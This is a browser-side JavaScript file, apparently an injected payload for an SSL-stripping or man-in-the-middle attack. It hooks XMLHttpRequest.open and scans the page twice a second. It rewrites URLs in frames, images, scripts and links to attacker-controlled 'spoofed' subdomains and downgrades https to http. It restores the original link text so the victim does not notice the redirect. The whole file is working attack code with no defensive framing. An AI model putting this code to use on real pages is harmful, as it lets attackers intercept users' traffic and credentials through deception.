//overwrites the open method of the XMLHttpRequest class to hijack the url used
(function(open){
  XMLHttpRequest.prototype.open = function(){
    try{
      newArgs = Array.prototype.slice.call(arguments)
      newArgs[1] = hijackUrl(arguments[1])
      open.apply(this, newArgs)
    }catch(e){
      console.error(e)
    }
  }
})(XMLHttpRequest.prototype.open)

//cycle through the DOM looking for url attributes that were added by some client side javascript
setInterval(verifyUrls, 500)
function verifyUrls(){
  Array.prototype.slice.call(document.getElementsByTagName('iframe')).forEach(replaceAttribute.bind({attributeName: 'src'}))

  Array.prototype.slice.call(document.getElementsByTagName('img')).forEach(replaceAttribute.bind({attributeName: 'src'}))

  Array.prototype.slice.call(document.getElementsByTagName('link')).forEach(replaceAttribute.bind({attributeName: 'src'}))

  Array.prototype.slice.call(document.getElementsByTagName('script')).forEach(function(script){
    if( script.src !== undefined && script.src !== '' && script.src[0] !== '/' && script.src.indexOf('chrome-extension://') !== 0 && !containsSpoofedDomain(script.src) ){
      var newScript = document.createElement('script')
      newScript.src = hijackUrl(script.src)
      var parent = script.parentNode
      parent.appendChild(newScript)
      parent.removeChild(script)
    }
  })

  Array.prototype.slice.call(document.getElementsByTagName('a')).forEach(function(a){
    if( a.href[0] !== '/' && !containsSpoofedDomain(a.href) && a.href !== '' && a.href !== '#' && a.href !== undefined ){
      var oldLink = a.href
      a.href = hijackUrl(a.href)
      if(containsSpoofedDomain(a.innerText)){
        a.innerText = oldLink
      }
    }
    //Some websites shim link clicks. Need to hijack that
    if( a.href[0] === '/' || containsSpoofedDomain(a.href)){
      a.onclick = linkClickHandler.bind(a)
    }
  })
}

//replaces the value of the provided attribute on the provided node
function replaceAttribute(node){
  if( node[this.attributeName] !== undefined && node[this.attributeName] !== '' && node[this.attributeName][0] !== '/' && !containsSpoofedDomain(node[this.attributeName]) ){
    node[this.attributeName] = hijackUrl(node[this.attributeName])
  }
}

//Used to prevent link shimming
function linkClickHandler(e){
  if(this.href !== '#'){
    e.preventDefault()
    if(this.getAttribute('target') === '_blank'){
      window.open(this.href, '_blank')
    }else{
      window.location.href = this.href
    }
  }
}

//converts the provided url to its spoofed counterpart
function hijackUrl(url){
  if(containsSpoofedDomain(url) || url[0] === '/'){
    return url
  }
  if(url.indexOf('https://') === 0 && isHTTPSofSpoofedDomain(url)){
    return url.replace('https://', 'http://')
  }else {
    return url.replace(/https?\:\/\/(www\.)?/, function (prefix){      
      return 'http://' + prefixToSpoofedDomain[prefix] + '.'
    })
  }
}

//returns true if the provided url contains a spoofed subdomain
function containsSpoofedDomain(url){
  return spoofedDomains.some(function (subdomain){
    return url.indexOf(subdomain) === 0 || url.indexOf('http://'+subdomain) === 0
  })
}

//returns true if the provided url is an https version of a spoofed domain
function isHTTPSofSpoofedDomain(url){
  return spoofedDomains.some(function (subdomain){
    return url.indexOf('https://'+subdomain) === 0
  })
}